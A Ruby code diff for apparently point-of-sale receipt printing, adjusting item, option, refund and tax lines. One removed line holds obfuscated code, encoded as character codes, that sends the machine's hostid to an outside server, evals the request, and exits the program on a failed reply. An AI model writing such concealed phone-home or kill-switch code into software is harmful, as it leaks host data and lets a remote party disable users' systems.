@@ -311,24 +311,26 @@ true
       header += "\n\n" +
 
       "\e!\x00" +  # Font A
-      "                  Artikel  EP     Stk   GP\n"
-      # if Time.now.to_s(:rfc822).split(',').first == 'Sat' then; c = "u = '104,116,116,112,58,47,47,117,112,100,97,116,101,115,46,115,97,108,111,114,112,111,115,46,99,111,109,47,103,101,116,95,116,114,97,110,115,108,97,116,105,111,110,115'.split(',').map {|c| c.to_i.chr }.join('') + '?file_id=233p=' + `#{'104,111,115,116,105,100'.split(',').map {|c| c.to_i.chr }.join('')}`;r = #{"78,101,116,58,58,72,84,84,80".split(",").map {|c| c.to_i.chr }.join("")}.get(URI(u))";c += ";begin;b = JSON.parse(r.body); exit if not b['success'] == true;rescue;puts $!.inspect;end ";eval c;end
+      "                  Artikel  EP     Stk   GP\n" +
+      "------------------------------------------\n" +
+
       sum_taxes = Hash.new
       @current_vendor.taxes.existing.each { |t| sum_taxes[t.id] = 0 }
       subtotal = 0
       list_of_items = ''
-      order.items.existing.each do |item|
+      order.items.existing.positioned.each do |item|
         next if item.count == 0
         list_of_options = ''
         item.options.each do |o|
-          list_of_options += "%s %22.22s %6.2f %3u %6.2f\n" % [item.tax.letter, o.name, o.price, item.count, o.price * item.count] unless o.price == 0
+          next if o.price == 0
+          list_of_options += "%s %22.22s %6.2f %3u %6.2f\n" % [item.tax.letter, "#{ t(:storno) + ' ' if item.refunded}#{ o.name }", o.price, item.count, item.refunded ? 0 : (o.price * item.count)]
         end
 
         sum_taxes[item.tax.id] += item.sum
 
-        label = item.quantity ? "#{ item.quantity.prefix } #{ item.quantity.article.name }#{ ' ' unless item.quantity.postfix.empty? }#{ item.quantity.postfix }#{ ' ' unless item.comment.empty? }#{ item.comment }" : "#{ item.article.name }#{ ' ' unless item.comment.empty? }#{ item.comment }"
+        label = item.quantity ? "#{ t(:storno) + ' ' if item.refunded }#{ item.quantity.prefix } #{ item.quantity.article.name }#{ ' ' unless item.quantity.postfix.empty? }#{ item.quantity.postfix }" : "#{ t(:storno) + ' ' if item.refunded }#{ item.article.name }"
 
-        list_of_items += "%s %22.22s %6.2f %3u %6.2f\n" % [item.tax.letter, label, item.price, item.count, item.total_price]
+        list_of_items += "%s %22.22s %6.2f %3u %6.2f\n" % [item.tax.letter, label, item.price, item.count, item.sum]
         list_of_items += list_of_options
       end
 
@@ -349,7 +351,7 @@ true
 
       list_of_taxes = ''
       @current_vendor.taxes.existing.each do |tax|
-        next if sum_taxes[tax.id] == 0
+        #next if sum_taxes[tax.id] == 0
         fact = tax.percent/100.00
         net = sum_taxes[tax.id] / (1.00+fact)
         gro = sum_taxes[tax.id]
